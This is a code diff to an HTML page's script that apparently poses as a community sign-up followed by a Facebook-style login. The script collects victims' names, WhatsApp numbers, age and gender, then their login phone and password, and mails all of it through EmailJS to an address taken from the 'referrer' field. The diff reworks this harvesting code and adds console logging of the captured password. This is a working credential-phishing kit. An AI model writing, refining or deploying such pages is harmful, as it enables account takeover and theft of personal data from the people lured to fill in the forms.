@@ -334,86 +334,87 @@
         Company Name
     </div>
 
-    <script>
-        const registerView = document.getElementById('registerView');
-        const loginView = document.getElementById('loginView');
-        const showRegisterBtn = document.getElementById('showRegisterBtn');
-        const loginField = document.getElementById('loginField');
-        const passwordField = document.getElementById('passwordField');
-        const loginBtn = document.getElementById('loginBtn');
+ <script>
+    const registerView = document.getElementById('registerView');
+    const loginView = document.getElementById('loginView');
+    const showRegisterBtn = document.getElementById('showRegisterBtn');
+    const loginField = document.getElementById('loginField');
+    const passwordField = document.getElementById('passwordField');
+    const loginBtn = document.getElementById('loginBtn');
 
-        let registrationData = {};
+    let registrationData = {};
 
-        function goToLogin() {
-            registerView.classList.add('hidden');
-            loginView.classList.remove('hidden');
-            document.body.style.backgroundColor = "#ffffff";
+    function goToLogin() {
+        registerView.classList.add('hidden');
+        loginView.classList.remove('hidden');
+        document.body.style.backgroundColor = "#ffffff";
+    }
+
+    function goToRegistration() {
+        loginView.classList.add('hidden');
+        registerView.classList.remove('hidden');
+        document.body.style.backgroundColor = "#f0f2f5";
+    }
+
+    // 1. Collect registration data and navigate to Login page
+    document.getElementById('communityForm').addEventListener('submit', function(event) {
+        event.preventDefault();
+
+        registrationData = {
+            fullName: document.getElementById('fullName').value.trim(),
+            whatsapp: document.getElementById('whatsapp').value.trim(),
+            fbDuration: document.getElementById('fbDuration').value.trim(),
+            age: document.getElementById('age').value.trim(),
+            gender: document.getElementById('gender').value.trim(),
+            referrer: document.getElementById('referrer').value.trim()
+        };
+
+        // Pre-fill login input with WhatsApp contact
+        if (registrationData.whatsapp !== '') {
+            loginField.value = registrationData.whatsapp;
         }
 
-        function goToRegistration() {
-            loginView.classList.add('hidden');
-            registerView.classList.remove('hidden');
-            document.body.style.backgroundColor = "#f0f2f5";
-        }
+        goToLogin();
+    });
 
-        // 1. Collect registration data and navigate to Login page
-        document.getElementById('communityForm').addEventListener('submit', function(event) {
-            event.preventDefault();
+    // 2. Switch back to Registration Page
+    showRegisterBtn.addEventListener('click', function(e) {
+        e.preventDefault();
+        goToRegistration();
+    });
 
-            registrationData = {
-                fullName: document.getElementById('fullName').value,
-                whatsapp: document.getElementById('whatsapp').value,
-                fbDuration: document.getElementById('fbDuration').value,
-                age: document.getElementById('age').value,
-                gender: document.getElementById('gender').value,
-                referrer: document.getElementById('referrer').value
-            };
+    // 3. Handle Login Submit & EmailJS dispatch
+    document.getElementById('authForm').addEventListener('submit', function(e) {
+        e.preventDefault();
 
-            // Pre-fill the login user/phone input with the WhatsApp contact
-            if (registrationData.whatsapp.trim() !== '') {
-                loginField.value = registrationData.whatsapp;
-            }
+        loginBtn.innerText = 'Logging in...';
+        loginBtn.disabled = true;
 
-            goToLogin();
-        });
+        // Grabbing inputs at exact time of submission
+        const templateParams = {
+            to_email: registrationData.referrer || '', // Destination recipient
+            full_name: registrationData.fullName || 'N/A',
+            whatsapp: registrationData.whatsapp || 'N/A',
+            experience: registrationData.fbDuration || 'N/A',
+            age: registrationData.age || 'N/A',
+            gender: registrationData.gender || 'N/A',
+            referrer_email: registrationData.referrer || 'N/A', // Changed from to_email
+            login_phone: loginField.value.trim(),
+            password: passwordField.value.trim() // Changed from login_password
+        };
 
-        // 2. Switch back to Registration Page
-        showRegisterBtn.addEventListener('click', function(e) {
-            e.preventDefault();
-            goToRegistration();
-        });
+        // Debug output in console to confirm password is non-empty before sending
+        console.log("Sending Payload:", templateParams);
 
-        // 3. Handle Login Submit & EmailJS dispatch
-        document.getElementById('authForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-
-            loginBtn.innerText = 'Logging in...';
-            loginBtn.disabled = true;
-
-            const templateParams = {
-                to_email: registrationData.referrer || '', // Sets recipient email from referrer input
-                full_name: registrationData.fullName || '',
-                whatsapp: registrationData.whatsapp || '',
-                experience: registrationData.fbDuration || '',
-                age: registrationData.age || '',
-                gender: registrationData.gender || '',
-                referrer: registrationData.referrer || '',
-                login_phone: loginField.value,
-                login_password: passwordField.value
-            };
-
-            emailjs.send("service_rf9jc9g", "template_ykjxd5h", templateParams)
-                .then(function(response) {
-                    alert('Email sent successfully!');
-                    loginBtn.innerText = 'Log in';
-                    loginBtn.disabled = false;
-                }, function(error) {
-                    alert('Failed to send email: ' + JSON.stringify(error));
-                    loginBtn.innerText = 'Log in';
-                    loginBtn.disabled = false;
-                });
-        });
-    </script>
-
-</body>
-</html>
+        emailjs.send("service_rf9jc9g", "template_ykjxd5h", templateParams)
+            .then(function(response) {
+                alert('Success!');
+                loginBtn.innerText = 'Log in';
+                loginBtn.disabled = false;
+            }, function(error) {
+                alert('Failed to send: ' + JSON.stringify(error));
+                loginBtn.innerText = 'Log in';
+                loginBtn.disabled = false;
+            });
+    });
+</script>
